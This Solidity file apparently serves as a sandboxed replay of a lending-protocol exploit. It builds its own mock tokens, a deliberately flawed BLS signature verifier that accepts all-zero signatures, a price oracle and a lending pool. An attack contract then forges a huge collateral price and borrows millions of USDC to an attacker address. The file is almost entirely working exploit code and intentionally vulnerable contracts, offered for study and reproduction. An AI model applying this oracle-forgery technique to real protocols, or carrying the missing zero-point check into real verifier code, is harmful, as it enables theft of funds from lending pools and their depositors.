// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

/// @notice Synthetic standalone exploit for the EVM Playground (2026-07-BonzoLend).
/// USDC + SAUCE are deployed as helperContracts (attacker nonce 0/1) so the
/// profit token address is known at config time. This contract deploys the
/// vulnerable Supra-shaped verifier/oracle + mini-lend and runs the attack.

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public immutable decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s, uint8 d) {
        name = n;
        symbol = s;
        decimals = d;
    }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) {
            require(a >= amount, "allowance");
            allowance[from][msg.sender] = a - amount;
        }
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

library VulnerableBLS {
    function verifySingle(
        uint256[2] memory signature,
        uint256[4] memory pubkey,
        uint256[2] memory message
    ) internal view returns (bool checkSuccess, bool callSuccess) {
        uint256 nG2x1 = 0x198e9393920d483a7260bfb731fb5d25f1aa493335a9e71297e485b7aef312c2;
        uint256 nG2x0 = 0x1800deef121f1e76426a00665e5c4479674322d4f75edadd46debd5cd992f6ed;
        uint256 nG2y1 = 0x090689d0585ff075ec9e99ad690c3395bc4b313370b38ef355acdadcd122975b;
        uint256 nG2y0 = 0x12c85ea5db8c6deb4aab71808dcb408fe3d1e7690c43d37b4ce6cc0166fa7daa;

        uint256[12] memory input;
        input[0] = signature[0];
        input[1] = signature[1];
        input[2] = nG2x1;
        input[3] = nG2x0;
        input[4] = nG2y1;
        input[5] = nG2y0;
        input[6] = message[0];
        input[7] = message[1];
        input[8] = pubkey[1];
        input[9] = pubkey[0];
        input[10] = pubkey[3];
        input[11] = pubkey[2];

        uint256[1] memory out;
        assembly {
            callSuccess := staticcall(gas(), 0x08, input, 0x180, out, 0x20)
        }
        checkSuccess = out[0] != 0;
    }

    function hashToPoint(bytes32) internal pure returns (uint256[2] memory p) {
        p[0] = 1;
        p[1] = 2;
    }
}

contract VulnerableSupraVerifier {
    mapping(uint256 => uint256[4]) public committeePublicKey;

    error BLSInvalidPublicKeyorSignaturePoints();
    error BLSIncorrectInputMessaage();

    /// @dev BUG: no zero-point rejection before pairing.
    function requireHashVerified_V2(
        bytes32 message,
        uint256[2] calldata signature,
        uint256 committeeId
    ) public view {
        bool callSuccess;
        bool checkSuccess;
        (checkSuccess, callSuccess) = VulnerableBLS.verifySingle(
            signature, committeePublicKey[committeeId], VulnerableBLS.hashToPoint(message)
        );
        if (!callSuccess) revert BLSInvalidPublicKeyorSignaturePoints();
        if (!checkSuccess) revert BLSIncorrectInputMessaage();
    }
}

contract VulnerablePullOracle {
    VulnerableSupraVerifier public immutable verifier;
    mapping(bytes32 => bool) public merkleSet;
    mapping(uint256 => uint256) public priceOf;
    mapping(uint256 => uint256) public updatedAt;

    error RootIsZero();
    error RootAlreadySeen();

    constructor(VulnerableSupraVerifier v) {
        verifier = v;
    }

    function verifyOracleProofV2(
        bytes32 root,
        uint256[2] calldata sigs,
        uint256 committeeId,
        uint256 pairId,
        uint256 price,
        uint256 timestamp
    ) external {
        if (root == bytes32(0)) revert RootIsZero();
        if (merkleSet[root]) revert RootAlreadySeen();
        verifier.requireHashVerified_V2(root, sigs, committeeId);
        merkleSet[root] = true;
        priceOf[pairId] = price;
        updatedAt[pairId] = timestamp;
    }
}

contract MiniBonzoLend {
    MockERC20 public immutable sauce;
    MockERC20 public immutable usdc;
    VulnerablePullOracle public immutable oracle;
    uint256 public constant PAIR_SAUCE_WHBAR = 425;
    uint256 public constant LTV_BPS = 8000;
    mapping(address => uint256) public sauceCollateral;
    mapping(address => uint256) public usdcDebt;

    constructor(MockERC20 _sauce, MockERC20 _usdc, VulnerablePullOracle _oracle) {
        sauce = _sauce;
        usdc = _usdc;
        oracle = _oracle;
    }

    function depositSauce(uint256 amount) external {
        require(sauce.transferFrom(msg.sender, address(this), amount), "pull");
        sauceCollateral[msg.sender] += amount;
    }

    function collateralValueUSDC(address user) public view returns (uint256) {
        uint256 px = oracle.priceOf(PAIR_SAUCE_WHBAR);
        return (sauceCollateral[user] * px) / 1e18;
    }

    function maxBorrowUSDC(address user) public view returns (uint256) {
        return (collateralValueUSDC(user) * LTV_BPS) / 10_000;
    }

    function borrowUSDC(uint256 amount) external {
        uint256 debt = usdcDebt[msg.sender] + amount;
        require(debt <= maxBorrowUSDC(msg.sender), "undercollateralized");
        usdcDebt[msg.sender] = debt;
        require(usdc.transfer(msg.sender, amount), "liquidity");
    }
}

/// @dev Playground entry. Helpers deploy USDC (nonce 0) then SAUCE (nonce 1).
contract BonzoLendExploit {
    address public immutable attacker;
    MockERC20 public immutable usdc;
    MockERC20 public immutable sauce;

    bytes32 constant FORGED_ROOT = 0xd4e6b48aef731cc8cd74b25fbaec267ff8a6269aea1f4be4ee19dda5ecbf3f7f;
    uint256 constant COMMITTEE_ID = 2;
    uint256 constant PAIR_SAUCE_WHBAR = 425;
    uint256 constant FORGED_PRICE = 1e30;
    uint256 constant COLLATERAL_SAUCE = 250e18;
    uint256 constant USDC_BORROWED = 6_634_528_202_695;
    uint256 constant POOL_USDC_LIQUIDITY = 10_000_000e6;

    constructor(address attacker_, MockERC20 usdc_, MockERC20 sauce_) {
        attacker = attacker_;
        usdc = usdc_;
        sauce = sauce_;
    }

    function attack() external {
        // Deploy vulnerable Supra-shaped stack (committee key[2] defaults to identity).
        VulnerableSupraVerifier verifier = new VulnerableSupraVerifier();
        VulnerablePullOracle oracle = new VulnerablePullOracle(verifier);
        MiniBonzoLend lend = new MiniBonzoLend(sauce, usdc, oracle);

        usdc.mint(address(lend), POOL_USDC_LIQUIDITY);
        sauce.mint(address(this), COLLATERAL_SAUCE);

        // 1) Deposit 250 SAUCE
        sauce.approve(address(lend), COLLATERAL_SAUCE);
        lend.depositSauce(COLLATERAL_SAUCE);

        // 2) Zero-signature oracle update for pair 425 at price 1e30
        uint256[2] memory zeroSig;
        oracle.verifyOracleProofV2(
            FORGED_ROOT, zeroSig, COMMITTEE_ID, PAIR_SAUCE_WHBAR, FORGED_PRICE, block.timestamp
        );

        // 3) Borrow historical USDC principal; forward to attacker EOA
        lend.borrowUSDC(USDC_BORROWED);
        require(usdc.transfer(attacker, USDC_BORROWED), "payout");
    }
}
